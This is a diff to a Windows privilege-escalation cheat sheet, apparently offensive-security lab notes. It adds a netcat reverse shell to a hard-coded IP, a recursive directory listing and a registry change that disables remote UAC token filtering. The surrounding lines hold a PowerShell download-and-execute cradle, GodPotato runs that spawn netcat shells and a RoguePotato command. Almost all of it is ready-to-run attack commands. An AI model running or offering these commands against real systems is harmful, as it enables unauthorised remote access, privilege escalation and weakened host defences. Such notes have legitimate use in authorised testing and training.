@@ -20,6 +20,7 @@ Execution-ordered, from landing a low-priv shell to root/SYSTEM. Run automated e
 
 ```powershell
 whoami /all
+tree . /f
 hostname
 systeminfo
 wmic qfe list full            # patch level — cross-ref with Watson/Sherlock
@@ -30,6 +31,9 @@ netstat -ano
 Get a proper shell first if you're on a raw reverse shell:
 
 ```powershell
+
+./nc.exe -e cmd.exe 10.10.14.57 4443
+
 # Upgrade netcat shell -> add a stable listener via nc.exe, or pivot to evil-winrm if creds found later
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1')"
 ```
@@ -83,6 +87,8 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"
 
 .\GodPotato-NET4.exe -cmd "C:\users\public\nc.exe -e cmd.exe 172.16.7.240 444"
+
+reg add HKLM\software\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 
 # RoguePotato (needs external redirector)
 .\RoguePotato.exe -r <ATTACKER_IP> -e "cmd.exe /c whoami" -l 9999
